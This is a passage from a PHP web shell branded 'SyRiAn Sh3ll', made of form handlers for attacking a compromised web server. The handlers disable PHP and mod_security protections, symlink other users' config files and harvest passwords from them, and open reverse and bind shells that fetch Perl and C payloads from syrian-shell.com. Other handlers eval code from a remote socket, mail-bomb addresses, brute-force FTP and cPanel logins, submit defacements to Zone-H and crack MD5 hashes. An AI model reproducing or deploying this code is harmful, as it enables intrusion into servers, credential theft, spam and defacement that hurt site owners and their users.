	else if(!file_exists($file)){echo "[-] The file is not exists ! .";}
	else
	{
		if($_POST['ChCommands'] == 'chmod')
		{
			$ch_ok = ChangeMode($file,$newAction);
			if($ch_ok){echo "[+] Permission Changed Successfully ! " ;}
			else{ echo "[-] Changing Is Not Allowed !! .";}
		}
		else if($_POST['ChCommands'] == 'chown')
		{
			$ch_ok = ChangeOwn($file,$newAction);
			if($ch_ok){echo "[+] Owner Changed Successfully ! " ;}
			else{ echo "[-] Changing Is Not Allowed !! .";}
		}
		else if($_POST['ChCommands'] == 'chgrp')
		{
			$ch_ok = ChangeGrp($file,$newAction);
			if($ch_ok){echo "[+] Group Changed Successfully ! " ;}
			else{ echo "[-] Changing Is Not Allowed !! .";}
		}
	}
}
# --------------------------
#   Forbidden
#---------------------------
else if($_POST['generateForbidden'])
{
	chdir($_POST['forbiddenPath']);
	mkdir('forbidden');
	chdir('forbidden');
	if($_POST['403'] == 'DirectoryIndex'){GenerateFile('.htaccess',"DirectoryIndex in.txt");}
	elseif($_POST['403'] == 'HeaderName'){GenerateFile('.htaccess',"HeaderName in.txt");}
	elseif($_POST['403'] == 'TXT')
	{
		GenerateFile('.htaccess',"
		Options all
		AddType text/plain .php 
		AddType text/plain .html
		AddHandler server-parsed .php
		AddHandler txt .php");
	}
	elseif($_POST['403'] == '404')
	{
		GenerateFile('.htaccess',"
		ErrorDocument 404 /404.html 
		404.html = Symlinked in.txt");
	}
	elseif($_POST['403'] == 'ReadmeName'){GenerateFile('.htaccess',"ReadmeName in.txt");}
	elseif($_POST['403'] == 'footerName'){GenerateFile('.htaccess',"footerName in.txt");}
	echo "
Now Go To /forbidden/in.txt Or /forbidden/
EX : ln -s /home/user/public_html/config.php in.txt";
}
# --------------------------
#   Upload Files
#---------------------------
else if($_POST['UploadNow'])
{
	$uploadingDir = $_POST['uploadingDir'];
	$uploadingDir = str_replace("\\\\","\\",$uploadingDir);
	$uploadingDir = str_replace("//","/",$uploadingDir);
	chdir($uploadingDir);
	$nbr_uploaded =0;
	$files_uploded = array();
	$path= '';
	$target_path= $path . basename($_FILES['uploadfile']['name'][$i]);
	for ($i = 0; $i < count($_FILES['uploadfile']['name']); $i++)
	{
		if($_FILES['uploadfile']['name'][$i] != '')
		{
			move_uploaded_file($_FILES['uploadfile']['tmp_name'][$i], $target_path . $_FILES['uploadfile']['name'][$i]);
			$files_uploded[] = $_FILES['uploadfile']['name'][$i];
			$nbr_uploaded++;
			echo "The File  ".basename($_FILES['uploadfile']['name'][$i])." Uploaded Successfully !
";
		}
		else "The File  ".basename($_FILES['uploadfile']['name'][$i])."  Can't Be Upload :( !";
	}
}
# --------------------------
#   no Security
#---------------------------
else if($_POST['doAction'] && ($_POST['someAction'] == 'genPhp'))
{
	$genTry = GenerateFile("php.ini","
	safe_mode = Off
	disable_functions = NONE
	safe_mode_gid = OFF
	open_basedir = OFF");
	echo "php.ini Has Been Generated Successfully";
	if($genTry){echo "[+] php.ini Has Been Generated Successfully ";}
	else {echo "[-] Failed to generate php.ini file !! ";}
}
else if($_POST['doAction'] && ($_POST['someAction'] == 'genHtaccess'))
{
	$genTry = GenerateFile(".htaccess","
<IfModule mod_security.c>
SecFilterEngine Off
SecFilterScanPOST Off
SecFilterCheckURLEncoding Off
SecFilterCheckCookieFormat Off
SecFilterCheckUnicodeEncoding Off
SecFilterNormalizeCookies Off
</IfModule>
<Limit GET POST>
order deny,allow
deny from all
allow from all
</Limit>
<Limit PUT DELETE>
order deny,allow
deny from all
</Limit>
SetEnv PHPRC ".getcwd()."/php.ini
	");
	if($genTry){echo "[+] .htaccess Has Been Generated Successfully ";}
	else {echo "[-] Failed to generate .htaccess file !! ";}
	
}
else if($_POST['doAction'] && ($_POST['someAction'] == 'genINI'))
{
	$genTry = GenerateFile("ini.php",'
ini_restore("safe_mode");
ini_restore("open_basedir");
	');
	if($genTry){echo "[+] ini.php Has Been Generated Successfully";}
	else {echo "[-] Failed to generate ini.php file !! ";}
}
# --------------------------
#  Reading Files
#---------------------------
# using [ fread | fgets |  readfile | file_get_contents | file | Exe | include | copy | mb_send_mail | curl_init | WScript.shell | win_shell_execute | win32_create_service | imap_open | symlink | tempnam ] .
else if($_POST['read'] || $_POST['show'])
{
	$file = $_POST['file'];
	$file = str_replace('\\\\','\\',$file);
	$file = str_replace('//','/',$file);
	if($_POST['read']){ReadingFiles($file);}	
	elseif($_POST['show']){ViewDirectories($file);}
}
# --------------------------
#   Metasploit RC
#---------------------------
else if($_POST['metaConnect'])
{
	$ip = $_POST['ip'];
	$port = $_POST['port'];
	if ($ip == "" && $port == ""){echo "Please fill IP Adress & The listen Port";} 
	else 
	{
		$ipaddr = $ip; 
		$port = $port;
		if (FALSE !== strpos($ipaddr, ":")) {$ipaddr = "[". $ipaddr ."]";}
		if (is_callable('stream_socket_client')) 
		{
			$msgsock = stream_socket_client("tcp://{$ipaddr}:{$port}");
			if (!$msgsock){die();}
			$msgsock_type = 'stream';
		} 
		elseif (is_callable('fsockopen')) 
		{
			$msgsock = fsockopen($ipaddr,$port);
			if (!$msgsock) {die(); }
			$msgsock_type = 'stream';
		}
		elseif (is_callable('socket_create')) 
		{
			$msgsock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
			$res = socket_connect($msgsock, $ipaddr, $port);
			if (!$res) {die(); }
			$msgsock_type = 'socket';
		} 
		else {die();}
		switch ($msgsock_type) 
		{ 
			case 'stream': $len = fread($msgsock, 4); break;
			case 'socket': $len = socket_read($msgsock, 4); break;
		}
		if (!$len) {die();}
		$a = unpack("Nlen", $len);
		$len = $a['len'];
		$buffer = '';
		while (strlen($buffer) < $len) 
		{
			switch ($msgsock_type) 
			{ 
				case 'stream': $buffer .= fread($msgsock, $len-strlen($buffer)); 
				break;
				case 'socket': $buffer .= socket_read($msgsock, $len-strlen($buffer));
				break;
			}
		}
		eval($buffer);
		echo "[*] Connection Terminated";
		die();
	}
}
# --------------------------
#  ACP Finder
#---------------------------
if (isset($_POST["submit_lol"])) 
{
	set_time_limit(0);
	$url = $_POST['hash_lol'];
	echo "Testing ".$url."\n";
	$extention = $_POST['extention'];
	$adminlocales = array(
"admin/",
"wp-admin/",
"administration/",
"administrator/",
"moderator/",
"webadmin/",
"adminarea/",
"bb-admin/",
"adminLogin/",
"admin_area/",
"panel-administracion/",
"instadmin/",
"memberadmin/",
"administratorlogin/",
"adm/",
"siteadmin/login".$extention."",
"admin/account".$extention."",
"admin/index".$extention."",
"admin/login".$extention."",
"admin/admin".$extention."",
"admin_area/login".$extention."",
"admin_area/index".$extention."",
"admincp/index".$extention."",
"adminpanel".$extention."",
"webadmin".$extention."",
"webadmin/index".$extention."",
"webadmin/login".$extention."",
"admin/admin_login".$extention."",
"admin_login".$extention."",
"panel-administracion/login".$extention."",
"admin_area/admin".$extention."",
"bb-admin/index".$extention."",
"bb-admin/login".$extention."",
"bb-admin/admin".$extention."",
"admin/home".$extention."",
"pages/admin/admin-login".$extention."",
"admin/admin-login".$extention."",
"admin-login".$extention."",
"admin/adminLogin".$extention."",
"home".$extention."",
"adminarea/index".$extention."",
"admin/controlpanel".$extention."",
"admin".$extention."",
"admin/cp".$extention."",
"cp".$extention."",
"adminpanel.php",
"moderator".$extention."",
"administrator/index".$extention."",
"administrator/login".$extention."",
"user".$extention."",
"administrator/account".$extention."",
"administrator".$extention."",
"login".$extention."",
"modelsearch/login".$extention."",
"moderator/login".$extention."",
"panel-administracion/admin".$extention."",
"admincontrol/login".$extention."",
"adm/index".$extention."",
"moderator/admin".$extention."",
"account".$extention."",
"controlpanel".$extention."",
"admincontrol".$extention."",
"webadmin/admin".$extention."",
"adminLogin".$extention."",
"panel-administracion/login".$extention."",
"wp-login".$extention."",
"adminLogin".$extention."",
"admin/adminLogin".$extention."",
"adminarea/index".$extention."",
"adminarea/admin".$extention."",
"adminarea/login".$extention."",
"panel-administracion/index".$extention."",
"modelsearch/index".$extention."",
"modelsearch/admin".$extention."",
"adm/admloginuser".$extention."",
"admloginuser".$extention."",
"admin2".$extention."",
"admin2/login".$extention."",
"admin2/index".$extention."",
"adm/index".$extention."",
"adm".$extention."",
"affiliate".$extention."",
"adm_auth".$extention."",
"memberadmin".$extention."",
"administratorlogin".$extention."");
	foreach ($adminlocales as $admin)
	{
		$headers = get_headers("$url$admin");
		if (eregi('200', $headers[0])) {echo "[+] $url$admin  ~ Found!\n";}
	}
}
# --------------------------
#   Config Finder PHP
#---------------------------
else if($_POST['doAction'] && ($_POST['someAction'] == 'findCon'))
{
	set_time_limit(0); 
	$passwd=fopen('/etc/passwd','r'); 
	if (!$passwd)
	{ 
		echo "[-] Error : coudn't read /etc/passwd"; 
		exit; 
	} 
	$path_to_public=array(); 
	$users=array(); 
	$pathtoconf=array(); 
	$i=0; 
	while(!feof($passwd)) 
	{ 
		$str=fgets($passwd); 
		if ($i>35) 
		{ 
		   $pos=strpos($str,":"); 
		   $username=substr($str,0,$pos); 
		   $dirz="/home/$username/public_html/"; 
		   if (($username!="")) 
		   { 
			   if (is_readable($dirz)) 
			   { 
				   array_push($users,$username); 
				   array_push($path_to_public,$dirz); 
			   } 
		   } 
		} 
		$i++; 
	} 
	echo ""; 
	echo "[+] Founded ".sizeof($users)." entrys in /etc/passwd
"; 
	echo "[+] Founded ".sizeof($path_to_public)." readable public_html directories
"; 
	echo "[~] Searching for passwords in config.* files...
"; 
	foreach ($users as $user) 
	{ 
		   $path="/home/$user/public_html/"; 
		   read_dir($path,$user); 
	} 
	echo "[+] Done"; 
}
# --------------------------
#   Config Finder Perl
#---------------------------
else if($_POST['doAction'] && ($_POST['someAction'] == 'findConPerl'))
{
	$file = file_get_contents('http://SyRiAn Cyb3r Army/sh/sh.txt');
	mkdir('AllConfigFiles',0755);
	chdir('AllConfigFiles');
	GenerateFile('sh.pl',$file);
	ChangeMode('sh.pl',0755);
	echo "Now Go to : AllConfigFiles/sh.pl";
}
# --------------------------
#   Mail Storm
#---------------------------
else if($_POST['sendMailStorm'])
{
	$to=$_POST['to'];
	$nom=$_POST['nom'];
	$Comments=$_POST['Comments'];
	if ($to <> "" )
	{
		for ($i = 0; $i < $nom ; $i++)
		{
			$from = rand (71,1020000000).""."Attacker.com";
			$subject= md5("$from");
			if(mail($to,$subject,$Comments,"From:$from"))
			echo "[+] $i spammed !!
";
			else 
			{echo "[-] $i Failed !! 
";}
		}
	}
}
# --------------------------
#  Help
#---------------------------
else if($_POST['emailExtractorHelp'])
{
	echo "This is Some Tables Name & Columns Name For Some Fam Scripts ..

[+] VBulletin
Table-name : user
column-name : email

[+] WordPress 
Table-name : wp_users
column-name : user_email 

[+] Joomla 
Table-name : jos_users
column-name : email

[+] PHPBB 
Table-name : phpbb_users
column-name : user_email

[+] I.P.Board 
Table-name : ibf_members
column-name : email

[+] SMF 
Table-name : smf_members
column-name : emailAddress ";
}
# --------------------------
#   MySQL Query
#---------------------------
else if($_POST['MySQLQuery'] && ($_POST['SQLType'] == 'SQLQuery'))
{
	$query = stripslashes($_POST['QU']);
	DBConnect($_POST['QU_HOST'],$_POST['QU_USER'],$_POST['QU_PASS'],$_POST['QU_DB']);
	$qwresult = mysql_query($query);
	$fields = _mysql_all_fields($qwresult);
	while ($rows = mysql_fetch_row($qwresult))
    {
      for ($i = 0; $i < sizeof($rows); $i++)
      {
        if (is_null($rows[$i])) {$rows[$i] = "[NULL]";}
        elseif (ereg("^[[:space:]]*$",$rows[$i])) {$rows[$i] = "[NULL]";}
        else {$rows[$i] = htmlspecialchars($rows[$i]);}
		echo $rows[$i]."
";
      }
	  echo " 
";
    }
}
# --------------------------
#   SQL Reader
#---------------------------
else if($_POST['MySQLQuery'] && ($_POST['SQLType'] == 'SQLReader'))
{
	DBConnect($_POST['QU_HOST'],$_POST['QU_USER'],$_POST['QU_PASS'],$_POST['QU_DB']);
	$unique = uniqid('N');
	$file = str_replace('\\\\','\\',$_POST['file']);
	$query = array(
	"CREATE TEMPORARY TABLE $unique (file LONGBLOB)",
	"LOAD DATA INFILE '".mysql_real_escape_string($file)."' INTO TABLE $unique",
	"SELECT * FROM $unique"
	);
	foreach($query as $Allqueries)
	{
		$mysqlQuery = mysql_query($Allqueries,$connect);
		while($line = mysql_fetch_row($mysqlQuery))
		echo htmlspecialchars($line[0]);
		echo "
";
	}
}
# --------------------------
#   Extract Emails				
#---------------------------
else if($_POST['MySQLQuery'] && ($_POST['SQLType'] == 'EmailExtractor'))
{
	DBConnect($_POST['QU_HOST'],$_POST['QU_USER'],$_POST['QU_PASS'],$_POST['QU_DB']);
	$emtab = $_POST['EM_TABLE'];
	$emcol = $_POST['EM_COLUMN'];
	$sql = mysql_query("SELECT * FROM $emtab");
	while($res = mysql_fetch_array($sql))
	{echo ''.$res["$emcol"].'
';}
}
# --------------------------
#   Files & Folders Handling 
#---------------------------
else if($_POST['editFileSubmit'])
{
	$fileName = $_POST['editFile'];
	$newFileName = $_POST['newName'];
	chdir($_POST['currentPath']);
	if(!file_exists($fileName)){echo "[-] Shit ! Where is the File ? \n[+] Now you can write the new file content ";}
	else{
	if($_POST['actionType'] == 'edit'){echo htmlspecialchars(file_get_contents($fileName));}
	else if($_POST['actionType'] == 'rename'){RenameFile($fileName,$newFileName);}
	else if($_POST['actionType'] == 'copy'){CopyFile($fileName,$newFileName);}
	else if($_POST['actionType'] == 'deleteFile'){DeleteFile($fileName);}
	else if($_POST['actionType'] == 'deleteFolder'){DeleteFolder($fileName);}
	else if($_POST['actionType'] == 'createFile'){GenerateFile($fileName,$newFileName);}
	else if($_POST['actionType'] == 'createFolder'){mkdir($fileName);}
	else if($_POST['actionType'] == 'zip'){ZipFile($fileName,getcwd()); }
	else if($_POST['actionType'] == 'unzip'){UnZip($fileName,getcwd());}
	else if($_POST['actionType'] == 'tar'){ Exe('tar -zcf '.$fileName." ".$fileName);}
	else if($_POST['actionType'] == 'untar'){ Exe ('tar -zxf '.$fileName);}
	else if($_POST['actionType'] == 'gz'){Exe('tar -czvf '.$fileName." ".$fileName);}
	else if($_POST['actionType'] == 'ungz'){Exe('gzip -d '.$fileName);}
	}
}
# --------------------------
#   Editing Files 
#---------------------------
else if($_POST['saveEditedFile'])
{
	chdir(stripslashes($_POST['currentPath']));
	$trytoGenerate = GenerateFile($_POST['file2edit'],$_POST['ExecutionArea']);
	if($trytoGenerate){echo "[+] File Saved !";}
	else {echo "[-] Failed To Save File !!";}
}
# --------------------------
#   Zone H Attacker
#---------------------------
else if($_POST['SendNowToZoneH'])
{
	ob_start();
	$sub = get_loaded_extensions();
	if(!in_array("curl", $sub)){die('[-] Curl Is Not Supported !! ');}
	$hacker = $_POST['defacer'];
	$method = $_POST['hackmode'];
	$neden = $_POST['reason'];
	$site = $_POST['domain'];
	
	if (empty($hacker)){die ("[-] You Must Fill the Attacker name !");}
	elseif($method == "--------SELECT--------") {die("[-] You Must Select The Method !");}
	elseif($neden == "--------SELECT--------") {die("[-] You Must Select The Reason");}
	elseif(empty($site)) {die("[-] You Must Inter the Sites List ! ");}
	$i = 0;
	$sites = explode("\n", $site);
	while($i < count($sites)) 
	{
		if(substr($sites[$i], 0, 4) != "http") {$sites[$i] = "http://".$sites[$i];}
		ZoneH("http://zone-h.org/notify/single", $hacker, $method, $neden, $sites[$i]);
		echo "Site : ".$sites[$i]." Defaced !\n";
		++$i;
	}
	echo "[+] Sending Sites To Zone-H Has Been Completed Successfully !! ";
}
# --------------------------
#   FTP And Cpanle Brute Force Attacker
#---------------------------
else if($_POST['BruteForceCpanelAndFTP'])
{
	$connect_timeout=5;
	set_time_limit(0);
	$submit = $_REQUEST['BruteForceCpanelAndFTP'];
	$users = $_REQUEST['users'];
	$pass = $_REQUEST['passwords'];
	$target = $_REQUEST['target'];
	$cracktype = $_REQUEST['cracktype'];
	
	if(empty($target)){$target = "127.0.0.1";}
	if(isset($submit) && !empty($submit))
	{
		if(empty($users) && empty($pass)){ print "[-] Please Check The Users or Password List Entry . . .";}
		if(empty($users)){ print "[-] Please Check The Users List Entry . . ."; }
		if(empty($pass)){ print "[-] Please Check The Password List Entry . . ";}
		$userlist=explode("\n",$users);
		$passlist=explode("\n",$pass);
		print "[~]# Cracking Process Started, Please Wait ...";
		foreach ($userlist as $user) 
		{
			$pureuser = trim($user);
			foreach ($passlist as $password ) 
			{
				$purepass = trim($password);
				if($cracktype == "ftp")
				{
					ftp_check($target,$pureuser,$purepass,$connect_timeout);
				}
				if ($cracktype == "cpanel")
				{
					cpanel_check($target,$pureuser,$purepass,$connect_timeout);
				}
			}
		}
	}
}
# --------------------------
#   Back Connection
#---------------------------
else if($_POST['backconn'])
{
	set_time_limit (0);
	$ip = trim($_POST['ip']); 
	$port = trim($_POST['backport']);
	$back_pass = trim($_POST['back_pass']);
	getFiles('http://SyRiAn Cyb3r Army/cgi/compiler.zip');
	UnZip('compiler.zip',getcwd());
	DeleteFile('compiler.zip');
	ChangeMode("compiler",0777);
	echo "[~] use this Command in NetCat : nc -vlp [Your PORT]";  
	if($_POST['use'] == 'php1')
	{
		$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
		if($sock < 0){die("[-] failed to create socket.");}
		$result = socket_connect($sock, $ip, $port);
		if($result < 0){die("[-] failed to connect back to host:".$_GET['host']);}
		$send_var = "\n\n -== SyRiAn Sh3ll , Back Connection ==-\n$";
		socket_write($sock, $send_var, strlen($send_var));
		while($input = socket_read($sock, 10000))
		{
			$result = `$input`;
			$result .= "\n$ ";
			socket_write($sock, $result, strlen($result));
		}
	}
	else if ($_POST['use'] == 'php2')
	{
		$chunk_size = 1400;
		$write_a = null;
		$error_a = null;
		$shell = 'uname -a; w; id; /bin/sh -i';
		$daemon = 0;
		$debug = 1;
	
		if (function_exists('pcntl_fork')) {
		   $pid = pcntl_fork();
		   
		   if ($pid == -1) {
			  printit("[-] ERROR: Can't fork");
			  exit(1);
		   }
		   
		   if ($pid) {
			  exit(0);  
		   }
	
		   if (posix_setsid() == -1) {
			  printit("[-] Error: Can't setsid()");
			  exit(1);
		   }
	
		   $daemon = 1;
		} else {
		   printit("[-] WARNING: Failed to daemonise.  This is quite common and not fatal.");
		}
		chdir("/");
		umask(0);
	
		$sock = fsockopen($ip, $port, $errno, $errstr, 30);
		if (!$sock) {
		   printit("$errstr ($errno)");
		   exit(1);
		}
	
		$descriptorspec = array(
		   0 => array("pipe", "r"),
		   1 => array("pipe", "w"), 
		   2 => array("pipe", "w")  
		);
	
		$process = proc_open($shell, $descriptorspec, $pipes);
	
		if (!is_resource($process)) {
		   printit("[-] ERROR: Can't spawn shell");
		   exit(1);
		}
		stream_set_blocking($pipes[0], 0);
		stream_set_blocking($pipes[1], 0);
		stream_set_blocking($pipes[2], 0);
		stream_set_blocking($sock, 0);
	
		printit("[+] Successfully opened reverse shell to $ip:$port");
	
		while (1) {
		   if (feof($sock)) {
			  printit("[-] ERROR: Shell connection terminated");
			  break;
		   }
		   if (feof($pipes[1])) {
			  printit("[-] ERROR: Shell process terminated");
			  break;
		   }
		   $read_a = array($sock, $pipes[1], $pipes[2]);
		   $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
	
		   if (in_array($sock, $read_a)) {
			  if ($debug) printit("SOCK READ");
			  $input = fread($sock, $chunk_size);
			  if ($debug) printit("SOCK: $input");
			  fwrite($pipes[0], $input);
		   }
	
		   if (in_array($pipes[1], $read_a)) {
			  if ($debug) printit("STDOUT READ");
			  $input = fread($pipes[1], $chunk_size);
			  if ($debug) printit("STDOUT: $input");
			  fwrite($sock, $input);
		   }
	
		   if (in_array($pipes[2], $read_a)) {
			  if ($debug) printit("STDERR READ");
			  $input = fread($pipes[2], $chunk_size);
			  if ($debug) printit("STDERR: $input");
			  fwrite($sock, $input);
		   }
		}
	
		fclose($sock);
		fclose($pipes[0]);
		fclose($pipes[1]);
		fclose($pipes[2]);
		proc_close($process);
	}
	else if ($_POST['use'] == "php3-win")
	{
		$env=array('path' => 'c:\\windows\\system32');
		$descriptorspec = array(
		0 => array("pipe","r"),
		1 => array("pipe","w"),
		2 => array("file","log.txt","a"));
	}
	else if ($_POST['use'] == "php3-linux")
	{
		$env = array('PATH' => '/bin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin');
		$descriptorspec = array(
		0 => array("pipe","r"),
		1 => array("pipe","w"),
		2 => array("file","/tmp/log.txt","a"));
	}
	if (($_POST['use'] == "php3-linux") || ($_POST['use'] == "php3-win"))
	{
		$proto=getprotobyname("tcp");
		if(($sock=socket_create(AF_INET,SOCK_STREAM,$proto))<0)
		{ die("[-] Socket Create Faile");}
		if(($ret=socket_connect($sock,$ip,$port))<0)
		{ die("[-] Connect Faile");}
		else{
		$message="----------------------PHP Connect-Back--------------------\n";
		$message.="----------------------- SyRiAn Sh3ll --------------------\n";
		socket_write($sock,$message,strlen($message));
		$cwd=str_replace('\\','/',dirname(__FILE__));
		while($cmd=socket_read($sock,65535,$proto))
		   {
		   if(trim(strtolower($cmd))=="exit"){socket_write($sock,"Bye Bye\n");exit;}
		   else{  
			$process = proc_open($cmd, $descriptorspec, $pipes, $cwd, $env);
			if (is_resource($process)) {
			fwrite($pipes[0], $cmd);
			fclose($pipes[0]);
			$msg=stream_get_contents($pipes[1]);
			socket_write($sock,$msg,strlen($msg));
			fclose($pipes[1]);
			$return_value = proc_close($process);}
		   }
			}
		}
	}
	else if ($_POST['use'] == 'perl1')
	{
		getFiles('http://syrian-shell.com/back/perl1.zip');
		UnZip('perl1.zip',getcwd());
		DeleteFile('perl1.zip');
		ChangeMode('perl1.sy3',0755);
		Exe('perl perl1.sy3 '.$ip." ".$port);
	}
	else if ($_POST['use'] == 'perl2')
	{
		getFiles('http://syrian-shell.com/back/perl2.zip');
		UnZip('perl2.zip',getcwd());
		DeleteFile('perl2.zip');
		ChangeMode('perl2.sy3',0755);
		Exe('perl perl2.sy3 '.$ip." ".$port." ".$back_pass);
	}
	else if ($_POST['use'] == 'perl3-linux')
	{
		getFiles('http://syrian-shell.com/back/back3-linux.zip');
		UnZip('back3-linux.zip',getcwd());
		DeleteFile('back3-linux.zip');
		ChangeMode('back3-linux.sy3',0755);
		Exe('perl back3-linux.sy3 '.$ip." ".$port);
	}
	else if ($_POST['use'] == 'perl4-win')
	{
		getFiles('http://syrian-shell.com/back/back4-win.zip');
		UnZip('back4-win.zip',getcwd());
		DeleteFile('back4-win.zip');
		ChangeMode('back4-win.sy3',0755);
		Exe('perl back4-win.sy3 '.$ip." ".$port);
	}
	else if ($_POST['use'] == 'php4')
	{DB_Shell('cb', "", $port, $ip);}
	else if ($_POST['use'] == 'c1')
	{connect_back_C('/tmp', 'gcc', $ip , $port); }
}
# --------------------------
#   Bind Connection
#---------------------------
else if($_POST['bind'])
{
	set_time_limit (0);
	$bindPass = trim($_POST['bind_pass']); 
	$port = trim($_POST['port']);
	getFiles('http://SyRiAn Cyb3r Army/cgi/compiler.zip');
	UnZip('compiler.zip',getcwd());
	DeleteFile('compiler.zip');
	ChangeMode("compiler",0777);
	echo "[~] use this Command in NetCat : nc –v –n [Server ip] [port]";  
	if($_POST['use'] == 'php1')
	{
		$mysock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
		socket_bind($mysock,'127.0.0.1', $port) or die('[-] Could not bind to address'); 
		socket_listen($mysock, 5);
		$client = socket_accept($mysock);
		$input = socket_read($client, 1024);
		echo $input;
		socket_close($client);
		socket_close($mysock);
	}
	else if ($_POST['use'] == 'perl1-linux')
	{
		getFiles('http://syrian-shell.com/bind/perl1-linux.zip');
		UnZip('perl1-linux.zip',getcwd());
		DeleteFile('perl1-linux.zip');
		ChangeMode('perl1-linux.sy3',0755);
		Exe('perl perl1-linux.sy3 '.$port." ".$bindPass);
	}
	else if ($_POST['use'] == 'perl2-linux')
	{
		getFiles('http://syrian-shell.com/bind/perl2-linux.zip');
		UnZip('perl2-linux.zip',getcwd());
		DeleteFile('perl2-linux.zip');
		ChangeMode('perl2-linux.sy3',0755);
		Exe('perl perl2-linux.sy3 '.$port);
	}
	else if ($_POST['use'] == 'bind3-win')
	{
		getFiles('http://syrian-shell.com/bind/bind3-win.zip');
		UnZip('bind3-win.zip',getcwd());
		DeleteFile('bind3-win.zip');
		ChangeMode('bind3-win.sy3',0755);
		Exe('perl bind3-win.sy3 '.$port);
	}
	else if ($_POST['use'] == 'php2')
	{DB_Shell('pb',"", $port, $ip) ;}
	else if ($_POST['use'] == 'c1')
	{
		getFiles('http://syrian-shell.com/bind/bind4-linux-c.zip');
		UnZip('bind4-linux-c.zip',getcwd());
		DeleteFile('bind4-linux-c.zip');
		ChangeMode('bind4-linux-c.c',0777);
		Exe('gcc -o bind4-linux-c.c bind4-linux-c');
		Exe('./bind4-linux-c -s /bin/sh -c girl -r /home -w '.$bindPass.' -p '.$port.'');
	}
}
# --------------------------
#  MD5 Cracker
#---------------------------
elseif($_POST['CrackMd5'])
{
	set_time_limit(0);
	function crack_md5() 
	{
	set_time_limit(0);
	$chars=$_POST['chars'];
	$chars=str_replace("<",chr(60),$chars);
	$chars=str_replace(">",chr(62),$chars);
	$c=strlen($chars);
	for ($next = 0; $next <= 31; $next++) {
	for ($i1 = 0; $i1 <= $c; $i1++) {
	$word[1] = $chars{$i1};
	for ($i2 = 0; $i2 <= $c; $i2++) {
	$word[2] = $chars{$i2};
	if ($next <= 2) {
	result(implode($word));
	}else {
	for ($i3 = 0; $i3 <= $c; $i3++) {
	$word[3] = $chars{$i3};
	if ($next <= 3) {
	result(implode($word));
	}else {
	for ($i4 = 0; $i4 <= $c; $i4++) {
	$word[4] = $chars{$i4};
	if ($next <= 4) {
	result(implode($word));
	}else {
	for ($i5 = 0; $i5 <= $c; $i5++) {
	$word[5] = $chars{$i5};
	if ($next <= 5) {
	result(implode($word));
	}else {
	for ($i6 = 0; $i6 <= $c; $i6++) {
	$word[6] = $chars{$i6};
	if ($next <= 6) {
	result(implode($word));
	}else {
	for ($i7 = 0; $i7 <= $c; $i7++) {
	$word[7] = $chars{$i7};
	if ($next <= 7) {
	result(implode($word));
	}else {
	for ($i8 = 0; $i8 <= $c; $i8++) {
	$word[8] = $chars{$i8};
	if ($next <= 8) {
	result(implode($word));
	}else {
	for ($i9 = 0; $i9 <= $c; $i9++) {
	$word[9] = $chars{$i9};
	if ($next <= 9) {
	result(implode($word));
	}else {
	for ($i10 = 0; $i10 <= $c; $i10++) {
	$word[10] = $chars{$i10};
	if ($next <= 10) {
	result(implode($word));
	}else {
	for ($i11 = 0; $i11 <= $c; $i11++) {
	$word[11] = $chars{$i11};
	if ($next <= 11) {
	result(implode($word));
	}else {
	for ($i12 = 0; $i12 <= $c; $i12++) {
	$word[12] = $chars{$i12};
	if ($next <= 12) {
	result(implode($word));
	}else {
	for ($i13 = 0; $i13 <= $c; $i13++) {
	$word[13] = $chars{$i13};
	if ($next <= 13) {
	result(implode($word));
	}else {
	for ($i14 = 0; $i14 <= $c; $i14++) {
	$word[14] = $chars{$i14};
	if ($next <= 14) {
	result(implode($word));
	}else {
	for ($i15 = 0; $i15 <= $c; $i15++) {
	$word[15] = $chars{$i15};
	if ($next <= 15) {
	result(implode($word));
	}else {
	for ($i16 = 0; $i16 <= $c; $i16++) {
	$word[16] = $chars{$i16};
	if ($next <= 16) {
	result(implode($word));
	}else {
	for ($i17 = 0; $i17 <= $c; $i17++) {
	$word[17] = $chars{$i17};
	if ($next <= 17) {
	result(implode($word));
	}else {
	for ($i18 = 0; $i18 <= $c; $i18++) {
	$word[18] = $chars{$i18};
	if ($next <= 18) {
	result(implode($word));
	}else {
	for ($i19 = 0; $i19 <= $c; $i19++) {
	$word[19] = $chars{$i19};
	if ($next <= 19) {
	result(implode($word));
	}else {
	for ($i20 = 0; $i20 <= $c; $i20++) {
	$word[20] = $chars{$i20};
	if ($next <= 20) {
	result(implode($word));
	}else {
	for ($i21 = 0; $i21 <= $c; $i21++) {
	$word[21] = $chars{$i21};
	if ($next <= 21) {
	result(implode($word));
	}else {
	for ($i22 = 0; $i22 <= $c; $i22++) {
	$word[22] = $chars{$i22};
	if ($next <= 22) {
	result(implode($word));
	}else {
	for ($i23 = 0; $i23 <= $c; $i23++) {
	$word[23] = $chars{$i23};
	if ($next <= 23) {
	result(implode($word));
	}else {
	for ($i24 = 0; $i24 <= $c; $i24++) {
	$word[24] = $chars{$i24};
	if ($next <= 24) {
	result(implode($word));
	}else {
	for ($i25 = 0; $i25 <= $c; $i25++) {
	$word[25] = $chars{$i25};
	if ($next <= 25) {
	result(implode($word));
	}else {
	for ($i26 = 0; $i26 <= $c; $i26++) {
	$word[26] = $chars{$i26};
	if ($next <= 26) {
	result(implode($word));
	}else {
	for ($i27 = 0; $i27 <= $c; $i27++) {
	$word[27] = $chars{$i27};
	if ($next <= 27) {
	result(implode($word));
	}else {
	for ($i28 = 0; $i28 <= $c; $i28++) {
	$word[28] = $chars{$i28};
	if ($next <= 28) {
	result(implode($word));
	}else {
	for ($i29 = 0; $i29 <= $c; $i29++) {
	$word[29] = $chars{$i29};
	if ($next <= 29) {
	result(implode($word));
	}else {
	for ($i30 = 0; $i30 <= $c; $i30++) {
	$word[30] = $chars{$i30};
	if ($next <= 30) {
	result(implode($word));
	}else {
	for ($i31 = 0; $i31 <= $c; $i31++) {
	$word[31] = $chars{$i31};
	if ($next <= 31) {
	result(implode($word));
	
	}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}
	
	function result($word) 
	{
		global $dat, $date;
		$hash = $_POST['pass'];
		$dat2 = date("H:i:s");
		$date2 = date("d:m:Y");
		if(md5($word)==$hash)
		{ 
			echo "[+] Cracked !! 
Password is: $word";
			exit;
		}
	}
